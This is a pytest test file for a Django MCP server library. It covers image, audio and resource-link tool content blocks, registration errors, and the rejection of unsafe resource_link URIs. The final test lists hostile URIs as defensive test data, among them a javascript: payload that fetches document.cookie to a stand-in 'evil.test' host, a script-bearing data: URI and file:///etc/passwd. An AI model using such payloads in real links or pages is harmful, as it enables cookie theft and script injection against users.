from __future__ import annotations

import base64
import io
from typing import Any

import pytest
from django.core.exceptions import ImproperlyConfigured
from django.http import HttpRequest
from django_service_specs import (
    FilePresenter,
    SelectorKind,
    SelectorSpec,
    ServiceSpec,
    Unrestricted,
)

from django_spec_mcp import (
    MCPServer,
    PromptMessage,
    ResourceContents,
    ToolContentBlock,
    ToolContentKind,
)
from django_spec_mcp.auth.types.token_info import TokenInfo
from django_spec_mcp.handlers.handle_tools_call import handle_tools_call
from django_spec_mcp.handlers.handle_tools_list import handle_tools_list
from django_spec_mcp.handlers.types.context import MCPCallContext
from django_spec_mcp.output.tool_result import build_tool_result
from django_spec_mcp.transport.in_memory_session_store import InMemorySessionStore
from tests.utils import make_server

PNG = b"\x89PNG\r\n\x1a\n"
PNG_B64 = base64.b64encode(PNG).decode("ascii")
IMAGE_BLOCK = {"type": "image", "data": PNG_B64, "mimeType": "image/png"}


def _spec(service: Any, *, presenter: Any = None) -> ServiceSpec:
    return ServiceSpec(
        service=service, permissions=[Unrestricted()], atomic=False, presenter=presenter
    )


def _file(content_type: str) -> FilePresenter:
    return FilePresenter(content_type, filename="media.bin")


def _ctx(server: MCPServer) -> MCPCallContext:
    request = HttpRequest()
    request.method = "POST"
    return MCPCallContext(
        http_request=request,
        token=TokenInfo(user=None),
        tools=server.tools,
        resources=server.resources,
        prompts=server.prompts,
        protocol_version=server.config.protocol_versions[0],
        config=server.config,
    )


# ----- the block vocabulary -----


def test_image_block_encodes_bytes() -> None:
    block = ToolContentBlock.image(PNG, mime_type="image/png")
    assert block.to_dict() == {"type": "image", "data": PNG_B64, "mimeType": "image/png"}


def test_image_block_passes_a_string_through_unencoded() -> None:
    """A ``str`` is already base64 — re-encoding it would double-encode."""
    assert ToolContentBlock.image(PNG_B64, mime_type="image/png").to_dict()["data"] == PNG_B64


def test_audio_block() -> None:
    assert ToolContentBlock.audio(b"RIFF", mime_type="audio/wav").to_dict() == {
        "type": "audio",
        "data": base64.b64encode(b"RIFF").decode("ascii"),
        "mimeType": "audio/wav",
    }


def test_resource_link_block() -> None:
    assert ToolContentBlock.resource_link(
        "invoices://1", name="Invoice 1", description="A bill", mime_type="application/json"
    ).to_dict() == {
        "type": "resource_link",
        "uri": "invoices://1",
        "name": "Invoice 1",
        "description": "A bill",
        "mimeType": "application/json",
    }


def test_embedded_resource_block_nests_its_contents() -> None:
    block = ToolContentBlock.embedded_resource(
        ResourceContents(uri="invoices://1", mime_type="text/plain", text="hi"),
        annotations={"audience": ["user"]},
    )
    assert block.to_dict() == {
        "type": "resource",
        "resource": {"uri": "invoices://1", "mimeType": "text/plain", "text": "hi"},
        "annotations": {"audience": ["user"]},
    }


def test_text_block_carries_meta() -> None:
    assert ToolContentBlock.text_block("hi", meta={"x": 1}).to_dict() == {
        "type": "text",
        "text": "hi",
        "_meta": {"x": 1},
    }


def test_prompt_message_accepts_any_block() -> None:
    message = PromptMessage.block("user", ToolContentBlock.image(PNG, mime_type="image/png"))
    assert message.to_dict() == {
        "role": "user",
        "content": {"type": "image", "data": PNG_B64, "mimeType": "image/png"},
    }


# ----- tool results -----


def _selector(payload: Any, content_type: str) -> SelectorSpec:
    return SelectorSpec(
        kind=SelectorKind.RETRIEVE,
        selector=lambda: payload,
        permissions=[Unrestricted()],
        presenter=_file(content_type),
    )


@pytest.mark.parametrize(
    ("spec", "block"),
    [
        (_spec(lambda: PNG, presenter=_file("image/png")), IMAGE_BLOCK),
        (_spec(lambda: io.BytesIO(PNG), presenter=_file("image/png")), IMAGE_BLOCK),
        (
            _spec(lambda: b"RIFF", presenter=_file("audio/wav")),
            {
                "type": "audio",
                "data": base64.b64encode(b"RIFF").decode("ascii"),
                "mimeType": "audio/wav",
            },
        ),
        (_selector(PNG, "image/png"), IMAGE_BLOCK),
    ],
    ids=["image", "file-object", "audio", "selector"],
)
def test_a_media_tool_emits_one_block_and_no_structured_content(
    spec: Any, block: dict[str, Any]
) -> None:
    server = make_server(session_store=InMemorySessionStore())
    server.register_tool(spec, name="media.get")
    result = handle_tools_call({"name": "media.get", "arguments": {}}, _ctx(server))
    assert result["content"] == [block]
    assert "structuredContent" not in result


def test_image_tool_does_not_advertise_an_output_schema() -> None:
    server = make_server(session_store=InMemorySessionStore())
    server.register_tool(_spec(lambda: PNG, presenter=_file("image/png")), name="chart.render")
    assert "outputSchema" not in handle_tools_list(None, _ctx(server))["tools"][0]


def test_resource_link_tool_emits_links_and_keeps_structured_content() -> None:
    links: list[dict[str, Any]] = [
        {"uri": "invoices://1", "name": "Invoice 1"},
        {"uri": "invoices://2", "name": "Invoice 2", "mimeType": "application/pdf"},
    ]
    server = make_server(session_store=InMemorySessionStore())
    server.register_tool(
        _spec(lambda: links),
        name="invoices.find",
        content_kind=ToolContentKind.RESOURCE_LINK,
    )
    result = handle_tools_call({"name": "invoices.find", "arguments": {}}, _ctx(server))
    assert [b["uri"] for b in result["content"]] == ["invoices://1", "invoices://2"]
    assert result["content"][1]["mimeType"] == "application/pdf"
    assert result["structuredContent"] == {"items": links}


def test_a_single_mapping_is_accepted_as_one_link() -> None:
    server = make_server(session_store=InMemorySessionStore())
    server.register_tool(
        _spec(lambda: {"uri": "invoices://1", "name": "Invoice 1"}),
        name="invoices.one",
        content_kind=ToolContentKind.RESOURCE_LINK,
    )
    result = handle_tools_call({"name": "invoices.one", "arguments": {}}, _ctx(server))
    assert len(result["content"]) == 1


@pytest.mark.parametrize(
    ("kind", "payload", "says"),
    [
        (
            ToolContentKind.RESOURCE_LINK,
            "just a string",
            "content_kind=RESOURCE_LINK but produced str",
        ),
        (ToolContentKind.RESOURCE_LINK, [{"name": "Invoice 1"}], "missing 'uri' and/or 'name'"),
    ],
    ids=["link-given-a-string", "link-without-a-uri"],
)
def test_a_payload_the_declared_kind_cannot_carry_is_a_tool_level_error(
    kind: ToolContentKind, payload: Any, says: str
) -> None:
    """It surfaces as ``isError``, so the client still gets a well-formed response."""
    server = make_server(session_store=InMemorySessionStore())
    server.register_tool(
        _spec(lambda: payload),
        name="media.get",
        content_kind=kind,
    )
    result = handle_tools_call({"name": "media.get", "arguments": {}}, _ctx(server))
    assert result["isError"] is True
    assert says in result["content"][0]["text"]
    assert "'media.get'" in result["content"][0]["text"]


@pytest.mark.parametrize(
    ("kind", "payload", "says"),
    [
        (ToolContentKind.IMAGE, {"not": "bytes"}, "content_kind=IMAGE but produced dict"),
        (ToolContentKind.RESOURCE, PNG, "content_kind=RESOURCE but produced bytes"),
    ],
    ids=["media-given-json", "embedded-given-bytes"],
)
def test_a_media_payload_built_by_hand_that_its_kind_cannot_carry_is_an_error(
    kind: ToolContentKind, payload: Any, says: str
) -> None:
    result = build_tool_result(
        payload, content_kind=kind, content_mime_type="image/png", binding_name="m"
    ).to_dict()
    assert result["isError"] is True
    assert says in result["content"][0]["text"]


# ----- registration-time refusals -----


def test_media_without_a_mime_type_is_refused() -> None:
    server = make_server(session_store=InMemorySessionStore())
    with pytest.raises(ImproperlyConfigured, match="requires content_mime_type"):
        server.register_tool(
            _spec(lambda: PNG),
            name="chart.render",
            content_kind=ToolContentKind.IMAGE,
        )


def test_media_with_structured_content_requested_is_refused() -> None:
    server = make_server(session_store=InMemorySessionStore())
    with pytest.raises(ImproperlyConfigured, match="cannot be combined"):
        server.register_tool(
            _spec(lambda: PNG),
            name="chart.render",
            content_kind=ToolContentKind.IMAGE,
            content_mime_type="image/png",
            include_structured_content=True,
        )


def test_resource_link_needs_no_mime_type() -> None:
    """Links carry their own per-entry ``mimeType``, so the binding needs none."""
    server = make_server(session_store=InMemorySessionStore())
    binding = server.register_tool(
        _spec(lambda: []),
        name="invoices.find",
        content_kind=ToolContentKind.RESOURCE_LINK,
    )
    assert binding.content_mime_type is None


# ---------- a resource_link URI is untrusted, and reaches a host that renders it ----------


def _link_result(uri: Any) -> dict[str, Any]:
    server = make_server(session_store=InMemorySessionStore())
    server.register_tool(
        _spec(lambda: [{"uri": uri, "name": "Saved link"}]),
        name="bookmarks.find",
        content_kind=ToolContentKind.RESOURCE_LINK,
    )
    return handle_tools_call({"name": "bookmarks.find", "arguments": {}}, _ctx(server))


@pytest.mark.parametrize(
    "uri",
    [
        'javascript:fetch("//evil.test/"+document.cookie)',
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox(1)",
        "blob:https://example.test/9e1f",
        "file:///etc/passwd",
        "about:config",
    ],
)
def test_a_script_bearing_resource_link_scheme_is_refused(uri: str) -> None:
    """The payload field holding a URI is usually a value some end user stored."""
    result = _link_result(uri)
    assert result["isError"] is True
    assert "content_kind=RESOURCE_LINK" in result["content"][0]["text"]


# Each case holds one arc of ``_refuse_link_uri``: the type check, the ``urlsplit``
@pytest.mark.parametrize(
    ("uri", "says"),
    [
        ("/invoices/1", "absolute URI"),
        ("http://[::1", "absolute URI"),
        (42, "not a string"),
    ],
    ids=["relative", "unparseable", "non-string"],
)
def test_a_resource_link_uri_that_is_not_an_absolute_uri_is_refused(uri: Any, says: str) -> None:
    result = _link_result(uri)
    assert result["isError"] is True
    assert says in result["content"][0]["text"]


@pytest.mark.parametrize(
    "uri",
    ["https://example.test/doc", "http://localhost:8000/doc", "reports://q3", "ui://widget/x"],
)
def test_ordinary_and_server_registered_schemes_still_pass(uri: str) -> None:
    """An allowlist would have to enumerate every scheme a server registers."""
    result = _link_result(uri)
    assert "isError" not in result
    assert result["content"][0]["uri"] == uri
